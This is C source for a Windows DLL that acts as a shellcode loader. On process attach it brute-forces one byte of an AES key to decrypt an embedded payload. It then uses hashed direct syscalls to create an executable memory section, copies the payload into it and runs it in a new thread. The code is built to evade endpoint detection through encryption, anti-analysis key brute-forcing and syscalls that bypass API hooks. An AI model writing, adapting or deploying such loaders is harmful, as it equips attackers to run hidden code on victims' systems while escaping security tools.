/* 

compile: gcc -O0 -finline-functions .\src.c .\some_functions.c .\aes.c .\aes.h -o section.exe
			
*/

#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#define MAX_BUF_SIZE 99999
#define CBC 1
#define AES128 1
#include "aes.h"

#include "skunk.h"
#include "new_config.h"

void runner(void){
    DWORD          SsnId, SsnHash;
    SYSCALL_LIST   List;
    NTSTATUS s;

    DWORD queryinformationprocess_hash = 2977827236; // [+] QueryInformationProcess [Length: 23] = 2977827236
    DWORD openprocess_hash = 1467497899;             // [+] OpenProcess [Length: 11] = 1467497899
    DWORD createsection_hash = 2993541892;           // [+] CreateSection [Length: 13] = 2993541892
    DWORD mapviewofsection_hash = 2227062;           // [+] MapViewOfSection [Length: 16] = 2227062
    DWORD createthreadex_hash = 1867318473;          // [+] CreateThreadEx [Length: 14] = 1867318473
    DWORD waitforsingleobject_hash = 996753945;      // [+] WaitForSingleObject [Length: 19] = 996753945

    ULONG len = 0;
    GetSyscallList(&List);
    LPVOID lpbaseaddress = NULL; 
    LPVOID rmlpbaseaddress = NULL;
	HANDLE hProcess, hThread, hSection = NULL;
    DWORD dwPID = 0;

   
	ULONG OldProtect = 0;
    LARGE_INTEGER SectionMaxSize = { 0,0 };
    NTSTATUS status;
    SIZE_T cbViewSize = 0 ;
    SectionMaxSize.LowPart = ENCRYPTED_BIN_LEN;
    
    // bruteforce decryption key
    struct AES_ctx ctx;
    BOOL brute = TRUE;
    unsigned char* cpbuf = malloc(ENCRYPTED_BIN_LEN * sizeof(unsigned char*));
    memcpy(cpbuf, encrypted_instructions, ENCRYPTED_BIN_LEN);
    for (int i = 0x00; i<=0xff;i++) {
        key[14] = i;
        AES_init_ctx_iv(&ctx, key, iv);
        AES_CBC_decrypt_buffer(&ctx, encrypted_instructions, ENCRYPTED_BIN_LEN);
        if (SuperFastHash(encrypted_instructions, ENCRYPTED_BIN_LEN-(encrypted_instructions[sizeof(encrypted_instructions)-1])) == PAYLOAD_HASH) { 
            brute = FALSE;
            // printf("[!] Decrypted \n");
            goto POOP;
        }
        memcpy(encrypted_instructions, cpbuf, ENCRYPTED_BIN_LEN);
        
    }
    // printf("[!] sad place\n");
    free(cpbuf);
    return;

POOP:
    if (!brute) {
        GetSSN(&List, createsection_hash, &SsnId);
        if (ZwX(SsnId, &hSection, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &SectionMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != STATUS_SUCCESS) {
            return;
        }
        GetSSN(&List, mapviewofsection_hash, &SsnId);
        if (ZwX(SsnId, hSection, NtCurrentProcess(), (void **)&lpbaseaddress, NULL, NULL, NULL, &cbViewSize, 2, NULL, PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS) {
            return; 
        }
        GetSSN(&List, createthreadex_hash, &SsnId);
        memcpy(lpbaseaddress, encrypted_instructions, ENCRYPTED_BIN_LEN); 
        if (ZwX(SsnId, &hThread, 0X1FFFFF, NULL,NtCurrentProcess(), (LPTHREAD_START_ROUTINE)lpbaseaddress, NULL, FALSE, NULL, NULL, NULL, NULL) != STATUS_SUCCESS) {
            return;
        }
        if (hThread == INVALID_HANDLE_VALUE) {
            return;
        } 
        GetSSN(&List, waitforsingleobject_hash, &SsnId);
        ZwX(SsnId, hThread, -1, NULL);
        return;
    }
    return; 
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		runner();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

